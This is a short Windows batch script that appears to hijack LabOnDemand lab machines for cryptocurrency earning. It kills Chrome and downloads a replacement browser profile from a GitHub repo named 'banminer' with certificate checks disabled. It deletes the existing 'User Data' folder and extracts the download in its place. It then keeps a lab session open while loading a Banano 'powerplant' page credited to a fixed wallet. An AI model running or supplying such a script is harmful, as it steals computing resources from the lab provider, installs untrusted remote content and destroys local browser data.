@echo off
title Labondemand Anti-Close:
set /p id="Enter Lab Cliet ID: "
echo Waitting Chrome Installed!
timeout 10 >nul
taskkill /f /im chrome.exe
cd C:\Users\Administrator\AppData\Local\Google\Chrome
curl -LJOk https://raw.githubusercontent.com/ngoc7sao9/banminer/main/UserData.7z
rmdir /Q /S "User Data"
7z.exe x UserData.7z
cd C:\Program Files\Google\Chrome\Application
start chrome.exe  https://labondemand.com/LabInstance/ResumeWithKey/?key=%id%
start chrome.exe  https://powerplant.banano.cc/?address=ban_1np5jpfjkqgufi6i3acn98594pw9kq7fej3abze96ocb8pii5wm3gir5jpfm
exit
